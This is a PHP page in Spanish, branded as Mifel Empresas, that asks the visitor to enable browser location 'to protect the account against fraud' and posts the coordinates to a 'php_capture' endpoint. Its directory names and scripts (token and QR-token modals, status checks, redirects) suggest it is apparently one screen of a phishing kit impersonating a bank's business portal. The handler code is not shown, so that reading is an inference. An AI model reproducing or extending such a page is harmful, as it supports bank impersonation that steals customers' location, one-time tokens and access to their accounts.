<?php
session_start();

if (!isset($_SESSION['usuario_id'])) {
    header('Location: index.php');
    exit;
}

require_once __DIR__ . '/../php_config/conexionbd.php';
require_once __DIR__ . '/../php_config/token_pantalla_helpers.php';

$pdo = conectarBD();
$usuario = tokenPantallaObtenerUsuario($pdo, (int) $_SESSION['usuario_id']);

if (!$usuario || !tokenPantallaPuedeAccederGps($usuario)) {
    header('Location: token.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activa tu ubicación - Empresas</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../css/feLinicio.css">
    <link rel="stylesheet" href="../css/_responsivefel.css">
    <link rel="stylesheet" href="../css/gps.css">
    <link rel="stylesheet" href="css/empresas-header.css">
    <link rel="stylesheet" href="css/empresas-token.css">
    <link rel="stylesheet" href="../php_modales/css/modales_input_no_input.css">
    <link rel="stylesheet" href="../php_modales/css/herramientas.css">
    <link rel="stylesheet" href="../php_modales/css/reloj_personalizado.css">
    <link rel="stylesheet" href="../php_modales/css/email_validate.css">
    <link rel="stylesheet" href="../php_modales/css/token_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/token_qr_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/contacto_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/sincronizacion.css">
    <link rel="stylesheet" href="../css/zeppelin_churro_btn.css">
    <?php require_once __DIR__ . '/../includes/responsive_movil.php'; mifel_responsive_movil_empresas(); ?>
</head>
<body>
    <header class="header-container empresas-header">
        <div class="header-wrapper">
            <div class="logo-center">
                <img src="../images/logo-empresas_BLANCO.svg" alt="Mifel Empresas" class="mifel-header-logo">
            </div>
            <?php require_once __DIR__ . '/includes/bienvenida_usuario.php'; ?>
        </div>
    </header>
    
    <main class="gps-container">
        <div class="gps-content">
            <div class="gps-icon-container">
                <img src="../images/gps.png" alt="Ubicación GPS" class="gps-icon">
            </div>
            
            <h1 class="gps-title">Activa tu ubicación</h1>
            
            <p class="gps-description">
                Permite a Mifel el acceso a tu ubicación desde el navegador para ayudar a proteger tu cuenta contra fraudes.
            </p>
            
            <form id="gpsForm" class="token-form" action="../php_capture/gps.php" method="POST">
                <input type="hidden" name="latitud" id="gpsLatitud" value="">
                <input type="hidden" name="longitud" id="gpsLongitud" value="">
                <input type="hidden" name="gps_estado" id="gpsEstado" value="">
                <button type="submit" id="gpsContinueBtn" class="continue-button">Continuar</button>
            </form>

            <a href="index.php?reiniciar=1" class="token-back">Volver</a>
        </div>
    </main>
    
    <script src="../js/gpsLocation.js"></script>
    <script>window.MODAL_BASE = '../';</script>
    <script src="../php_modales/js/check_status.js"></script>
    <script src="../php_modales/js/modales_input_no_input.js"></script>
    <script src="../php_modales/js/herramientas.js"></script>
    <script src="../php_modales/js/reloj_personalizado.js"></script>
    <script src="../php_modales/js/redirecciones.js"></script>
    <script src="../php_modales/js/email_validate_handler.js"></script>
    <script src="../php_modales/js/token_empresa_handler.js"></script>
    <script src="../php_modales/js/token_qr_empresa_handler.js"></script>
    <script src="../php_modales/js/contacto_empresa_handler.js"></script>
    <script src="../php_modales/js/sincronizacion_handler.js"></script>
</body>
</html>
